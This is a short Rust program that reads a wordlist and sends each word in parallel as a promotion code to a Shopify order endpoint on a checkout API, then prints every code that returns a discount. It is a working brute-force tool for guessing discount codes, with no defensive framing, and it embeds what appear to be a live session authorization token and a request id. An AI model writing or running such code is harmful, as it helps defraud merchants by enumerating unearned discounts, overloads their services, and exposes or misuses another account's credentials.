use std::fs::File;
use std::io::{BufRead, BufReader};
use rayon::prelude::*;
use ureq::json;
fn main() {
    let words_file = "words.txt";
    let file = File::open(words_file).unwrap();
    let reader = BufReader::new(file);
    let words: Vec<String> = reader.lines().map(|x| x.unwrap()).collect();
    let _: Vec<_> = words.par_iter().map(|i| check_discount_validity(i)).collect();
}

fn check_discount_validity(code: &String) {
    let agent = ureq::Agent::new()
    .set("X-Flow-Request-Id", "chkeoHar5tEeRN7EF0dLISu")
    .set("Authorization", "Session F51ePh77LGlHuAMRMLw5DaJTmddFJBh9F8scSsrrR41WAOXwELzPyNJ6Atsd81cX")
    .build();

    let resp = agent.post("https://api.flow.io/ledger/shopify/orders/f7521e416be9/promotion?expand=experience&envelope=request")
    .send_json(
        json!({
            "body" : json!({
                "code" : code
            }),
            "method" : "PUT"
        })
    );

    let response_result_json = resp.into_json();
    if let Ok(response_json) = response_result_json {
        if let Some(response_code) = response_json.get("code") {
            if response_code == "generic_error" {
                return; //not a valid code, because it contains a key for "code", which has the value generic_error
            }
        }
    
        let discount_amount = &response_json["items"][0]["discounts"][0]["label"];
        println!("code: {} discount amt: {}", code, discount_amount)
    }
}